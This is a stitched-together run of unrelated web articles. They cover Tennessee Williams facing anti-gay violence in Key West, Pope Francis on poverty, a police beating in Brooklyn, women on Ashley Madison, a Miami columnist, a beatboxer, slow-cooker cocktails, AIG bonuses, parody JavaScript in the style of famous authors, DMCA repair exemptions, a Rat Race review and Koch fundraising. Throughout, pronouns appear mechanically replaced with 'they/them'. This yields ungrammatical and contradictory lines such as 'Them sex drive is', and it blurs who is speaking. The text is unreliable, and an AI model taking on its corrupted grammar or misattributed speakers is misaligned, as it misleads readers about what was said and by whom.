Five days into the new year a landscape architect who worked for Williams (among others) was found lying nude in a pool of blood at their home, murdered at point-blank range by shots to the head and neck. Six days later the house Williams has owned for 30 years was broken into: A screen was slit open, a window smashed, the backyard roses trampled and odd things taken, like a toaster and lawn chairs. Within the month Williams and a houseguest, New York author Dotson Rader, were attacked as they emerged woozy and late from the Monster, a gay disco off Duval Street. Williams says they and Rader were harmonizing on an old hymn, “And they walk with me/And they talk with me,” when four or five young men jumped them from the shadows. Rader says they were slugged in the jaw; Williams was knocked down and their glasses broken. “Let's run,” Rader shouted. “They may have knives.” Williams stood their ground. “I am not in the habit of retreat,” they declared.
As Key West's most prominent citizen and most famous gay, the playwright finds themselves embroiled in a drama of resentment and recrimination that bizarrely echoes their own work. Tension has been building slowly since the late 1960s, when Key West, once the haven of warring Indians, pirates and drunken sailors, began to decline as a Navy base and a port. Billed as ‘the last resort,” the city began attracting people who needed one: homosexuals. They now make up a quarter of the 32,000 population and many have become important merchants and business people.
As the consequent wave of renovation swept the island, real estate prices and taxes soared, whipping up anti-gay hostility among the natives, or “conchs,” as they call themselves. Reports of assault and robbery—crimes that police link to the influx of male prostitutes—have escalated, and the “rough trade” is inevitably tied up with the drug trade. Police theorize that Williams' gardener—a bejeweled eccentric fond of shrieking “I am a sick woman”—was murdered by men looking for a stash of cocaine.
Williams, whose mother once catalogued their sons preoccupying themes as “murder, cannibalism, castration, madness, incest, rape, adultery, nymphomania and homosexuality,” professes to find some gallows humor in this tempest in the tropics. “Maybe they weren't punks at all,” they joked after the street fight, “but New York drama critics. That mugging received better and more extensive publicity than anything I ever wrote.” Some of Williams' friends are less sanguine—notably Rader (whom some Key West sympathizers find faintly hysterical on the subject). “It has been terrible,” they said in the aftermath. “Tenn won't talk about it, but it has been really frightening what's happening in Key West and in this house. The worst was the night they stood outside their front porch and threw beer cans, shouting, ‘Come on out, faggot.' When they set off the firecrackers, I remember thinking, ‘God, this is it. We're under attack. They've started shooting.' ”
Williams' imperturbability springs both from a matter of principle (he once defined gallantry as “the grace with which one survives appalling experiences”) and from a diminished interest in the Key West gay scene. “I've retired from the field of homosexuality at present,” they explain, “because of age. I have no desires—isn't that strange? I have dreams, but no waking interest.” The thought does not cheer him. “I've always found life unsatisfactory,” they say. “It's unsatisfactory now, especially since I've given up sex.” Their own problems seem far more pressing to them than the city's. “I suspect I'll only live another two years,” says Williams, 68, who tipples white wine from morning on and complains of heart and pancreas disorders. “I've been working like a son of a bitch since 1969 to make an artistic comeback. I don't care about the money, but I can't give up art—there's no release short of death. It's quite painful. I'll be dictating on my deathbed. I want people to say, ‘Yes, this man is still an artist.' They haven't been saying it much lately.”
As a consummate prober of human passions, Williams does have theories on why their adopted hometown is under siege. “There are punks here,” they explain. “That's because a couple of gay magazines publicized this place as if it were the Fire Island of Florida. It isn't. One Fire Island is quite enough. But it attracted the wrong sort of people here: the predators who are looking for homosexuals. I think the violence will be gone by next year.”
Other residents seem less willing to wait. The leader of the anti-gay forces, the Reverend Wright, says Anita Bryant has promised to come to Key West to help their crusade. Recalling nostalgically the days when “female impersonators and queers were loaded into a deputy's automobile and shipped to the county line,” Wright warns: “We'll either have a revival of our society or the homosexuals will take it over in five years.”
Even the nonchalant Williams is more careful now. They haven't ridden their bicycle or walked down Duval Street late at night since the attack. Because they are in the habit of going to their studio in the backyard to write, they take along their Persian, Black Sabbath, to sniff around first. Rader is even more cautious. “I refuse to go out alone at night,” they said recently. “I don't need to have my head bashed in on Duval Street. I am more frightened here than I am in New York.”
Despite the pleas of admirers and friends, however, Williams refuses to abandon Key West. “There is violence everywhere,” they say. “I think the 1980s are going to be terrifying because we simply cannot feed all the people on the earth. When the middle class gets hungry, we could have Armageddon. I don't want to be around to see it.” Until then, they stubbornly intend to ignore the provocation of anti-gay forces. “I've been here longer than they have,” Williams says, “and I'm not leaving.”
VATICAN CITY, April 4 (UPI) -- Pope Francis, in a taped conversation with Flemish students Thursday, said their concern for the poor does not make them a communist, but merely is evidence of the teachings of the Gospel.
“I am a believer in God and Jesus Christ. For me, the heart of the Gospel is in the poor. I heard two months ago that someone said, ‘With all this talk of the poor, this pope is a communist.' No, this is a banner of the Gospel, poverty without ideology. The poor are at the center of Jesus' gospel,” they told the students in a 30-minute interview posted on the Belgian website deredactie.be.
The pope also mentioned the happiness of living their faith.
“I have a certain inner peace, a happiness that comes with age,” they said. “If I'm afraid of anything, it is only of myself.”
They added they had problems like anyone else but was pleased to live within their Christian commitment.
The Vatican announced Friday the pope ordered distribution of thousands of copies of the New Testament to be distributed at Masses at the Vatican Sunday. The announcement came as the pope prepared for their first meeting with Italian Premier Matteo Renzi and their family Friday.

The Brooklyn DA and NYPD Internal Affairs are investigating cops caught on tape beating a man wrongly suspected of trespassing in a Crown Heights synagogue, authorities said yesterday.
The Oct. 8 beatdown took place at the Alternative Learning Institute for Young Adults, a synagogue and outreach center for troubled youths.
Cops believed that Ehud Halevy, 21, was homeless and trespassing.
A volunteer security guard mistakenly called police, not knowing Halevy had been staying there for about a month, with permission.
NYPD spokesperson Paul Browne said one of the cops involved, a 49-year-old man, “has been placed on modified assignment.”
A source said, “The Brooklyn DA is looking at the tape and investigating the circumstances of the arrest.”
When cops first approached, Halevy, not wearing a shirt or pants, refused to leave.
“You're not kicking me out — I have a right to stay here,” they insisted according to law-enforcement sources.
Halevy put on their pants before the confrontation escalated to the incident caught on tape.
They were booked for assault, obstructing governmental administration, criminal trespassing, resisting arrest, harassment and pot possession.
“He [Halevy] was in a needy position. They needed a place to sleep,” said Rabbi Moshe Feiglin, who runs the center.
Several politicians said cops went overboard in using force.
“When we watched the video and saw some of New York's Finest behaving in a not very fine way, brutalizing an individual for absolutely no reason, it was just something horrible,” said Brooklyn Assemblyman Dov Hikind.
The volunteer security guard, 24-year-old Zalmy Trappler, said they regret calling cops on Halevy.
“He was sleeping naked on the couch, so I told them to leave. I said, ‘You have five minutes to leave,' and they said, ‘If you don't leave, I'll kick your ass,'” Trappler said.
“I deeply regret calling the police. When I saw the video, I got emotional — I felt like it could have been avoided. If I knew it would have gone that way, I never would have made the call.”
Trappler said they and Havely have made their peace since the incident happened.

Thanks to its morally reprehensible concept and sleazy ad campaigns, Ashley Madison — the website for married people looking to cheat — brings to mind gross, gleefully unfaithful married dudes trolling for hot extramarital vaginas. But it takes, as they say, two to tango. What about the women who use the site?
In a piece for GQ, writer Teddy Wayne set out to get to know some "lady Don Drapers," as the magazine calls them. Wayne meets with several women, attempting to find out what makes them intent on cheating on their husbands. While you might have some idea in your mind about who might be open to affairs — passive, sad, lonely attention-starved housewives? — the truth is that many of the women Wayne meets with are aggressive go-getters, so-called Alpha Females. The theory is that it has something to do with the power balance in the marriage:
There's […] a keeping-up-with-the-Mrs.-Robinsons pressure, especially among wives who have at least as much power as their spouses, says Kate Bolick, author of The Atlantic's much discussed "All the Single Ladies" cover article. "When I've watched women cheat in their thirties, they're not necessarily unhappy with their husbands, but they're all alpha women, and they feel entitled to what they want," they say.
Wayne meets with Megan (none of the names are real) who says:
"I'm a dirty old man trapped in a woman's body. I lust after younger men the way dirty old men lust after younger girls. I get dirty old men. I'm looking for eye candy. I'm very shallow."
Megan describes themselves as well over 200 lbs., which is ironic, considering the fact that Ashley Madison had an ad campaign that hinged on finding fat women "scary" and undesirable. Them sex drive is, and always has been, very very high.
Advertisement
They tell me that she's been corporeally disloyal in relationships since they started having sex at 16 and has don't-ask, don't-tell permission to frolic with other lovers from their "nerd" husband of nearly two decades, with whom they have several children. "He can barely handle me, and he's super-vanilla," Megan says. "But he's also a fantastic guy and father. We have a really happy and functional house."
Advertisement
She's definitely not a bored housewife. Wayne points out: "She's worked for one of the most prominent political figures in the country and nearly ended up in Obama's administration."
Then there's Sarah, who married young but finds their sexually unadventurous husband "suffocating."
As with most of the women I've interviewed, they label themselves "more of the controller" in the relationship: "I earn more. I repair everything. I fixed up the house."
Advertisement
Another "Alpha." Next is Laura, a corporate type who seems like she's an "Alpha," even if they don't want to be:
"In the workplace, it should be equal," they say. "But in the house, the only way it works is if there's a strong masculine and feminine component. You need to give your husband a blow job every day. They should feel like a king. Seeking it out in my sexual life is to make up for it in my real life. I want my husband to be dominant and more successful. I don't want to be the man in the relationship."
Although Laura uses Ashley Madison to hook up with what they call "very rich and older and dominant" men, it could be argued that she, too is a take-charge type of woman — after all, she's taken the initiative to seek out men behind their husband's back.
Advertisement
But the truth is, labeling a woman an Alpha is ignoring how truly complex personalities can be. Not all "Alpha females" are cheaters, and what these women really have in common is the desire to seek sex outside of marriage. As Wayne writes,
Other than Megan, the only one who is open with their husband, the women I have met are all, by their own admission, either deeply unhappy or deeply dishonest with their spouses. Monogamy may defy certain biological imperatives and may not make as much sense for modern eighty-year life spans, but that's the contract you sign up for; if it isn't for you, then opt out or marry someone new.
Since all of these women feel the need to sneak around instead of ending their marriages (although, by the end of the piece, Laura claims she's left their husband), could it be that the traits being labeled as "Alpha" — dominant, aggressive — are also tied to a deep cowardice?
The lady has cojones, which is more than we can say for the rest of the editorial page. Krog spends most of their time writing unsigned editorials, typically on the subject of county government. But they also pen signed opinion columns, which are sassier. For instance in a recent column they blasted Miami-Dade County Mayor Alex Penelas for opposing the hiring of Angela Gittens as the county's new aviation director. "For their political gain, Penelas is making it nearly impossible for MIA -- and therefore the public they purport to serve -- to get the strong, experienced management it needs," Krog wrote. "You have to wonder from whom Penelas is taking advice and counsel these days. I'd suggest they fire their butts."
On another occasion Krog was equally blunt toward the newest member of the school board. "It wasn't that I expected new Miami-Dade School Board member Jacqueline Pepper to start their public life with a quick display of leadership or anything," Krog allowed. "She's a political newcomer, after all, and has a lot to learn on the job. But I sure thought that for starters she'd do something smarter than hire their husband as a staff aide. It's legal, says Pepper. Sure, but it's not right."
And on the nomination by President George W. Bush of Linda Chavez as secretary of labor, Krog had this to say: "If Chavez is a victim of anything beyond their own bad judgment calls, it isn't the Beltway's witch-hunt atmosphere as they claim, but Bush's unwise selection of them in the first place."
Krog's strongest column of the past year, however, was far more personal. They wrote about the death of their father: "A few words about this man: They called dry cereal pop-nuts-scrummies.' They took in strays -- both the two-legged and four-legged varieties. They baptized a basset hound that wandered onto the place and became their adoring shadow Soupbone' for its sorry shape. They had only one usable arm after polio but played basketball, touch football, and softball with their kids on summer evenings after a long, hard day of farm work. They never whined, never complained, never looked back with regret, always leaning slightly forward into life, which they embraced and accepted for what it was -- and for what it could be."
Why Amit is Underrated: 3 Things Every Beatboxer Needs to Note
We have a lot to learn from Amit.
Amit Bhowmick is a Queens native, an integral member of the Beatbox House, and a champion of popular routines like “Soldier,” “Wild Style,” and “Jab Jab Uppercut.” You might know them for their particular “OD bass” technique and their collaboration with the talented and eccentric violinist Luisa in a project called Viobox.
Amit currently holds the titles of East Coast, Midwest and New England beatbox champion, often finding themselves in the finals of major beatbox competitions.
However, Amit has stayed relatively quiet compared to other major competition winners - often and undeservedly overlooked. Amit champions a unique philosophy and possesses lots of incredible skills that the beatbox community can learn from.
Let's break them down.
1. Unshakeable focus
Amit is a true believer of meditation and executing in the “flow state.” In order to perform at maximum capacity, you must treat a battle with the your utmost focus. If you watch their battles, you'll see them unfazed and looking straight-on, which can intimidate the opponent but, more importantly, shows their determination to win.
Another mistake that distracted beatboxers make in battles is that they beatbox to the tempo of their opponents, meaning that their routines are passively guided by their opponents rather than actively controlled by themselves.
Amit's unshakeable focus allows them to beatbox at their own tempo and influence their opponents to take it slow and be a pawn to their slow groove - throwing fast-paced beatboxers off completely.
2. Consistency and confidence of silence
Amit's focus contributes to the consistency of their routines - especially when it comes down to flow. Amit's flow is unmatched due to their natural capability to maintain a steady tempo throughout an entire routine.
No fill or transition is rushed.
Amit isn't scared to use silence to their advantage. Modern day beatboxers come at beatbox battles, trying to fit in as many sounds as they can and inattentively throwing in their signature sounds while they are at it.
These guys are fresh bait to Amit, because their ability to take it slow and take suspenseful breaks creates a sense of control and confidence - a stark contrast to a rushed routine.
3. Quality over quantity: the perfection of routines
One of the greatest criticisms Amit receives is that they lack diversity of material, hinting how battles seem to be a poor indicator of a beatboxer's skill. Amit champions the philosophy of “quality over quantity” in great style.
Amit is a perfectionist and one of the very few who understands the value of patience. They work hard, doubling down on their strengths and building their own unique routines up to the point where no more sounds can be added or removed - with each routine filled with intricate detail and deliberate placement.
Most beatboxers don't have the patience to do that, and unfortunately end up spreading themselves thin - becoming sloppy generalists. Every sound and routine Amit possesses, they execute cleanly - unblemished and immaculate.

Show Amit some love!
Whether it's their focus, flow, or patience, there are so many great things we can all learn from Amit. Besides their impeccable beatbox ability, Amit is a super nice guy with great insight into what beatboxing is all about. They also post lots of photos and great videos, so please show them some love by following them on Instagram!

We're constantly excited by the inventive ways that people use their slow cookers. When we heard that people were making drinks in them we thought "that's pretty cool..." When we heard that people were making alcoholic slow cooker drinks, we thought "HELL YEAH!" Now don't get us wrong - we love the classic slow cooker recipes, but cracking out the slow cooker and filling it with something that's guaranteed to get the party started? Can't think of anything better, personally!
Nothing beats the smell of mulled wine as you sit down in a pub next to an open fire, or the smell of a coffee with a good slug of whiskey in it as you slowly start to forget it's winter and that it's hammering it down outside (hic!)...just like it is as I write this.
Smushy back-story aside, let's get down to the good stuff. We've trawled the internet so that you don't have to:
5 Alcoholic Slow Cooker Drinks You Must Make This Winter
Slow Cooker Mulled Wine - A classic winter drink that you absolutely have to make if you have a slow cooker. The smell, the taste, the warming feeling you get when you've had a few glasses (otherwise known as 'feeling tipsy') - you simply cannot go wrong. Winter Sangria - We love how ridiculous this recipe sounds, and love even more that the base ingredients are two bottles of red and a good slug of brandy. The recipe is in American measurements, but is very easy to convert - just remember that 1 cup = ~225ml. Slow Cooker Irish Coffee - Coffee and Whiskey, two of life's great things, combined with a bit of slow cooker action. This one is great to have on the go at ANY time during winter, and can easily be adjusted for taste and volume. Slow Cooker Hot Cranberry Toddy - If there are two things guaranteed to keep a man happy, it's meat and whiskey. This allows you to make a seemingly winter recipe, whilst still having a good slug of whiskey in to get that lovely burn on the back of your throat. Bourbon Citrus Sipper - Another hot drink with Whiskey (are you sensing a theme here?!) - sugar and spice really, in this case, does make everything nice. Again an American recipe, so remember your cup/ml conversion (1 cup = 225ml).
So there you have it - if that doesn't seem like good use of your slow cooker, then nothing will!

WASHINGTON/NEW YORK (Reuters) -- American International Group is preparing to pay millions of dollars more in bonuses to dozens of corporate executives, a source familiar with the development said.
AIG (AIG, Fortune 500) has been talking with Washington's newly-appointed compensation czar Kenneth Feinberg about the bonuses, which are due to be paid on July 15, said the source.
The payments AIG is set to make next week were previously disclosed. About 40 senior managers were awarded some $9 million in performance bonuses for 2008 but payments were to be partly staggered throughout 2009, and contingent on certain targets related to AIG's restructuring.
The company is reviewing its compensation plans with Washington as it tries to avoid the national furor set off by $165 million in retention bonuses paid to employees of a financial products unit in March. Much of AIG's $99 billion in losses last year stemmed from derivatives written by that unit.
Feinberg was appointed last month to oversee the compensation of top executives at seven firms that have received large federal bailouts.
The firms must convince Feinberg "they have struck the right balance to discourage excessive risk taking and reward performance for their top executives," Treasury spokesperson Andrew Williams said in a statement, responding to AIG's pending bonus payments.
"That process is just beginning now, and Feinberg has begun consulting with those firms about their compensation plans," the statement said, adding the Treasury will not "provide a running commentary on that process."
AIG, which declined to comment, has received more than $80 billion in federal loans in successive bailouts since its near-collapse last September. In total, U.S. taxpayer aid of up to $180 billion has been extended to the insurer that once claimed global dominance.
AIG is in the midst of reducing liabilities at its financial products unit, and selling or spinning off some of its prized insurance operations in a bid to repay taxpayers.
In total, AIG last year agreed to pay in excess of $1 billion in retention payments and performance bonuses to employees across the organization, including to the financial products employees.
Some financial products executives agreed to return their bonuses in full or in part after the payments spurned anger across the nation.

(New Book “If Hemingway wrote JavaScript” Now Available)
Last summer I introduced the concept of literary JavaScript with If Hemingway wrote JavaScript in which five well known authors wrote a JavaScript utility to generate the Fibonacci sequence. In May I presented their efforts at JSConf 2013, and to mark the occasion I asked an additional six authors (as well as the irrepressible Hemingway) to solve factorial(n) as only they could. Here's what they sent me…
Jack Kerouac
“All of JavaScript is a foreign country”
/*...the only numbers for me are the mad ones, take forty-three like a steam engine with a talky caboose at the end*/ n = 43, /*and that lanky fellow in a cocked fedora*/ r = 1 /*then back to our number, our mad number, mad to become one*/ while (n > 1) /*mad to descend*/ n--, /*mad to multiply*/ r = r * n /*and at the end, you see the blue center-light pop, and everybody goes 1.4050061177528801e+51...*/ r
Kerouac is renowned for their spontaneous, stream-of-consciousness approach to writing, supposedly delivering some works at a single sitting. Since planning is alien to Kerouac's process, they have no use for functions. Their solution will only return the factorial of 43. If you want the factorial of another number, you'll need to rewrite it.
Notice how comments are virtually indistinguishable from code; to Kerouac it's all the same – one long, rhapsodic outpouring.
Samuel Johnson
“When a man is tired of JAVA-SCRIPT, they are tired of LIFE”
# In which various NUMBERS are summon'd by # means of ELECTRONICK CONJURY factorial = (n) -> # All argument is against it; yet all belief is for it return 1 unless n # Ingenious sophistry to prove the palp'bly OBVIOUS return 1 if n is 1 # Recursion (n.) # a program that calls 'pon itself in the manner of # a dog returning unto its VOMIT return n * factorial n - 1
When I opened Johnson's completed assignment, I found a short note from the good doctor, explaining why they had chosen to use CoffeeScript: “Sir, the funcktion key-word is an ALBATROSS and the curly brace is worthless FILIGREE. I desire a clean and artickulate script for the dockumenting of my varied MUSINGS”.
And indeed Johnson's solution radiates sparse elegance, albeit liberally peppered with their own pithy witticisms: they express their incredulity that factorial(0) is 1, is amused that it should require an entire statement to ascertain that factorial(1) is indeed 1, and finishes with a sardonic definition of recursion lifted, presumably, from their own dictionary.
Johnson's solution lies at the intersection of art and parody – a gentle self-mocking blended with uncluttered expression and genuine beauty. A dowf of the tricorn to you, Doctor.
James Joyce
“Writing in JavaScript is the most ingenious torture ever devised for sins committed in previous lives”
function hacktorial(integette) { var nonthings = [undefined, null, false, 0, '', NaN]; var resultution = 1; if (integette == 0) { //behold the strangerous zeroine! resultution = 1; } else { while (integette > 1) //caligulate by multicapables resultution = resultution * integette--; } with(resultution) { var duodismal = Function('return this').call(toString(12)); var disemvowel = Function("n","return n?parseInt(n,12):'0'") return [ disemvowel(duodismal.slice(0,-1)), 'shillings and', disemvowel(duodismal[duodismal.length-1]), 'pence' ].join(' '); } //klikkaklakkaklaskaklopatzklatschabattacreppycrottygraddahappluddyappladdypkonpkot! }
OK, where do we start? Joyce is not content with merely solving the problem at hand, they are compelled to turn it into a raucous adventure on the high seas of verbal deviancy.
They continue the Joycean tradition of generating contrived yet intuitive portmanteau words (most abundantly present in Finnegans Wake). Here's a mini glossary for the Joyce-less among us:
hacktorial–the function is a hack on factorial
integette–indicating that if you don't use a small integer it's all ruined
nonthings–for reasons best known to Joyce, our function begins with a declaration of falsey values
resultation–the result of the computation
strangerous–both strange and dangerous
zeroine–our hero, value 0
caligulate–to calculate, presumably with a liberal dose of tyranny
multicapables–items capable of being multiplied
duodismal–the bleakness that is the duodecimal system (i.e. base 12)
disemvowel–to remove all vowels, or in this case all letters
By the time he's halfway through, the problem is already solved, but Joyce insists on converting the result into the currency of the time: shillings and pence. As with much of Joyce's work, there's a degree of method to this madness, since the factorial of every number over 3 is divisible by 12 – which also happens to be the number of pennies in a shilling.
Here's what we get:
hacktorial(3) //"0 shillings and 6 pence" hacktorial(4) //"2 shillings and 0 pence" hacktorial(7) //"420 shillings and 0 pence" hacktorial(21) //"4257578514309120000 shillings and 0 pence"
Richard Feynman
“I never pay attention to anything by experts. I program everything myself.”
//using Ramanujan's approximation function fractorail(n){ with(Math) { var r = sqrt(PI)*pow(n/E,n); r *= pow(8*pow(n, 3) + 4*(n*n) + n + 1/30, 1/6); return r; } }
Although better known as a maverick scientist, Feynman's work is characterized by the daring originality and eccentric brilliance that is the hallmark of the greatest authors. Their factorial solution is no exception.
Feynman chooses to distance themselves from conventional strategies and instead uses a little known approximation which allows them to calculate the factorial of integers and non-integers alike. Their boyish delight at this discovery is evident from the playful name they assign to the function. They also toss in a delicious with , just to prove the pedants wrong.
Here's a few factorial's, Feynman style. Don't worry about the alleged “rounding errors”, if you're at all familiar with JavaScript, they'll likely be a source of comfort to you.
fractorail(3); //6.00005 fractorail(1.1); //1.04671 fractorail(5.2); //169.40628
Arthur Conan Doyle
“You know my methods. Apply them”
"use strict"; //In solving a problem of this sort, the grand thing is to be able to reason backwards... //some things are easier known than explained! var caseHistory = new Object({2:2, 6:3}); function unfactorial(evidence){ //first, humility! if (evidence === 1) { return "Watson, I am at a loss!" } //second, logical precedence! if(caseHistory[evidence]){ //elementary! return caseHistory[evidence]; } //third, eliminate the impossible! if(evidence === 0 || evidence % 24 !== 0) { return "charlatans!"; } //fourth, deduction! var theDeduction, enumarator = evidence, denominator = 1; while(enumarator % denominator === 0) { enumarator = enumarator/denominator++; if (enumarator === denominator) { theDeduction = enumarator; } } theDeduction = theDeduction || "impostors"; //What one man can invent another can discover! caseHistory[evidence] = theDeduction; //What remains, however improbable, must be the truth! return theDeduction; }
Conan Doyle is best known as the author of the Sherlock Holmes mysteries and they were clearly in full deer-stalker and magnifying glass mode when solving the case of the hidden factorial.
Or, rather, unfactorial. Because Holmes lives by deduction and their methodology is to work backwards towards the source of the deed – the well worn, predictable process of the factorial holds no mystery for him. Instead Holmes opts to trace those fiendish numbers that seed existing factorial results.
As expected, Holmes' process is precise and meticulously ordered – clearly they were an early adopter of the imperative approach. Notice they also direct their utility to run in strict mode – he'll tolerate no sloppiness. They start with a dose of humility – even the master sleuth cannot be certain which number has a factorial of 1 – but they quickly gain their stride, so that by the end of the exercise they imperiously deride those who would supply false arguments as charlatans and impostors. Case closed Watson.
Jane Austen
“A programmer, especially if they have the misfortune of knowing anything, should conceal it as well as they can”
factorial = (function() { //I declare... var ledger = {}; return function reckoning(quantity) { if (isNaN(quantity)) { console.log("I have not the pleasure of understanding you"); return; } //It is a truth universally acknowledged that two values //can only be adjudged truly agreeable by means of === if (quantity === 0) { return 1; } //Mr Crockford teaches that we be wary of inherited property... if (ledger.hasOwnProperty(quantity)) { return ledger[quantity]; } //Pray persist until an answer is furnished return ledger[quantity] = quantity * reckoning(quantity - 1); }; })();
Jane Austen's solution demonstrates two pleasing characteristics for which they are justly famous. First there's their attention to craft and structural integrity, reflected here in the neat packaging of their code – they invoke the module pattern, hiding away the historical data (or ledger) within the folds of the super structure. Second is their playful, even subversive, send-up of the powers that be and their ridiculous conventions.
At first glance Austen's code appears to be submissive, yielding to every overbearing commandment and pious proclamation set forth by the more pedantic leaders in our community. Yet a closer reading reveals a rich undertone of parody. There are several clues to Austen's real intent: checking if the argument is a number of pokes fun at edge-case mania, their over-embellished commentary suitably ridicules those who insist that == is the devils work, and finally the satirical fawning over the nice Mr Crockford is used as an amusing justification for the all-too-common misuse of hasOwnProperty .
Austen is on top of their game here, simultaneously gaining approval from the purveyors of code dogma, while winking furiously at those who can see beyond the artifice and discern the subtext that ridicules those they purport to follow.
Ernest Hemingway
“When you stop writing JavaScript for fun you may as well be dead”
//Economy. function factorial(n) { return n < 2 ? 1: factorial(n-1)*n; }
Enough said.
What have we learned?
The greatness of the best novelists, poets and play-writes lies in their readiness to stake out new ground, to pioneer new techniques in writing and in doing so lay the tracks for those who follow.
All the best writers in English have been flagrant flouters of prescriptive rules
– Steven Pinker
As with the best writers, when a good developer breaks a rule, they don't do so arbitrarily, but because a dubious constraint has formed a barrier to their means of expression. Patterns that were once viewed as dangerous and radical – immediately invoked functions, callbacks and modules – are, thanks to the risk takers, now part of the JavaScript mainstream. The message is clear: the progress of the JavaScript language depends on the willingness of its best developers to take risks, to play, and so discover new patterns and idioms that benefit the community at large.

The FTC and US Library of Congress enacted similar legislation in 2014 that allows you to unlock your own smartphone. Until today, however, it was illegal to mess with the programs in your car, thermostat or tractor, thanks to strict provisions in the DMCA's Section 1201. That applied even to researchers probing the device security for flaws, a service that helps both the public and manufacturers. For example, researchers commandeered a Jeep on the road to show it could be done, an act that was technically illegal.
You could have also been sued just for trying to repair your own electronics. In a well-publicized example, John Deere told farmers that they have no right to root around in the software that runs their tractor even when they're just trying to fix the damned thing. That issue alone prompted over 40,000 public comments to the US Copyright Office demanding stronger ownership rights.
DMCA 1201, and the rulemaking process, create unconstitutional restraints on speech, and need to be struck down by a court or fixed by Congress.
The exemptions have certain restrictions -- consumers are only allowed to do "good-faith" hacking on "lawfully-acquired" devices. That means, for instance, that you can still get in trouble if you gain unauthorized access to a device you don't own. Also, researchers can't probe internet services or public services like airlines either, meaning that the jet hack done last year would still be illegal now.
Groups like the Electronic Frontier Foundation, iFixit and Repair.org fought to have research and repair activities exempted from the DMCA, since they actually have nothing to do with copyright law. "You could be sued or even jailed for trying to understand the software in your devices, or for helping others do the same," the EFF wrote.
The new exemptions are nice, but critics are still fuming over the fact that they took a year to kick in and are only good for two years. Repair and research advocates say that the process for changing copyright law is unnecessarily expensive and onerous, too. "The one year delay ... was not only a violation of law, not only pointless, but actively counterproductive," the EFF wrote. "DMCA 1201, and the rulemaking process, create unconstitutional restraints on speech and need to be struck down by a court or fixed by Congress."
If you've seen Rat Race, chances are it wasn't by choice. Along with Ace Ventura, Spy Kids 2 and Little Nicky, it is simply one of those films that nobody actively decides to watch but has undoubtedly at some point found themselves watching, probably during secondary school wet break. However, despite never being listed alongside early noughties comedy greats as Zoolander or Meet the Parents, it is worth far more than its 44% on Rotten Tomatoes suggests.
First off, Rat Race features a world class comedic ensemble. John Cleese heads up the cast as the blindingly white-toothed billionaire who lures a bunch of random idiots into chasing down $2 million across the American Southwest in order to bet on them with their rich cronies. Rowan Atkinson, Whoopi Goldberg, Wayne Knight, Seth Green, Amy Smart and Breckin Meyer all show up for the fun. As Atkinson's performance as Italian narcoleptic Enrico quickly establishes, chewing the scenery is simply a matter of course for all involved and Rat Race is much better for it.
Directed by one third of the writing-directing team behind Airplane!, Jerry Zucker, there's no pretending that Rat Race is a patch on the eighties classic. That said, it's a very different movie; there's no “Don't call me Shirley” wordplay fun. Instead, the emphasis here is less on wit, and more on slapstick. There's no real subtlety to the moment when Cuba Gooding Jr. – on the downwards curve of their post-Oscar career – forces a bus driver to hand over their clothes in order to steal their bus. “My wife is having a baby!” they yell, throwing out any female genitalia-related word they can think of as the bus driver undresses with increasing speed. Though having Academy Award winner Cuba Gooding Jr. yell “Vagina!” seems like a low point, even for Rat Race, the joke plays: making fun of men being uncomfortable with gynecological issues will never not be funny.
The characters are pretty much all despicable people, with the exception of an adorable Breckin Meyer (hi Breckin!). This could kill the movie stone-dead but really, the correct viewing approach is to immediately decide you hate them all and want none of them to win. There's a sick joy in watching them slowly uncover the depths to which they are willing to sink for money. Thankfully, Zucker never attempts to shoehorn in any genuine emotional beats. Even the deliciously ironic end, which sees Smash Mouth force them all to give their money to charity, doesn't totally forgive them of their greed. Except for Breckin Meyer, obviously.
The set pieces are absurd… ly fantastic. From Amy Smart flying a chopper practically into their ex-boyfriend's house to Seth Green and co. accidentally tying a cow to a hot air balloon, to Jon Lovitz and family accidentally gatecrashing a veterans event while in Hitler's car, Rat Race doesn't concern itself with trivial things like plausibility and ‘the law'; instead it shoves Whoopi Goldberg (another Academy Award winner) inside the fastest car on earth and makes them break the speed of sound. How can you not be on board with a ride like that?
As a ‘chase' film, Rat Race does unequivocally stand up. We have a variety of modes of transport: monster truck, helicopter, truck, the fastest car on earth and an Love Lucy tour bus. And to give Zucker credit where credit is due, the sense of momentum does not let up. Though the contestants' journeys are often stop-start, their enforced pauses are only served to increase the tension. Randy Pear (Jon Lovitz)'s accidental family excursion to the Nazi Klaus Barbie museum does bring a genuine sweatdrop to the forehead and you can't help but sympathise with Enrico (Atkinson) as they hunt for a donor heart in scrubland with the disturbingly hapless Zack (Knight). The insanity of the race itself is effectively contrasted by the relative inertia of John Cleese and friends in their Las Vegas hotel and it's nice that they're there at the end to get their own comeuppance.
At its heart, Rat Race is a morality tale for us all. The characters reveal themselves as personifications of greed, selfishness and ruthlessness whose moral failings repeatedly cause them to suffer. Only when confronted with true charitable goodness at the end are they finally shamed into being good. We should learn from Rat Race. Firstly, if a weird billionaire sends you to New Mexico to find $2 million dollars, keep a calm head, think strategically and remember how the bourgeoisie like to exploit the proletariat for fun. And secondly, a capacity for evil lies within us all and to combat this, we need to attend more charity concerts.
It's hardly Se7en but still, for that inspiring message alone, it's worth watching the slightly subpar noughties slapstick caper that is Rat Race.

At their most recent retreat in Southern California two weeks ago, the billionaire industrialists Charles and David Koch and 450 of their donor-allies announced plans to spend $889 million over the next two years to influence state and federal elections and shape the national discourse. The money would go to bankrolling political activity, funding think tanks and academic research, and fueling grassroots organizing efforts around the country—all in support of the Kochs' pro-business, free-market-centric ideology. That eye-popping, nine-figure goal made national headlines, but what wasn't reported was that the Kochs and their allies were already well on their way to banking that huge amount of money.
Donors at the Palm Springs confab pledged $249 million toward funding the Koch brothers' grand plan, according to two sources with knowledge of the fundraising haul. A spokesperson for Freedom Partners, the organization that hosts the donor summits and helps distribute the money raised at them, declined to comment. If the Koch network raises comparable sums at its remaining donor retreats between now and November 2016—it tends to hold two to three such gatherings a year—it will easily meet, if not surpass, its $889 million target.
The retreats—first hosted by the Kochs in 2003, when a mere 17 people attended—serve not only as strategy sessions but as showcases and fundraisers for an array of conservative and libertarian organizations, including more politically active outfits like Americans for Prosperity, wonky think tanks, and issue-based nonprofits focusing on veterans issues, health care, and seniors. Typically, toward the end of each retreat, donors gather for lunch and take turns pledging big amounts for Koch-backed causes.
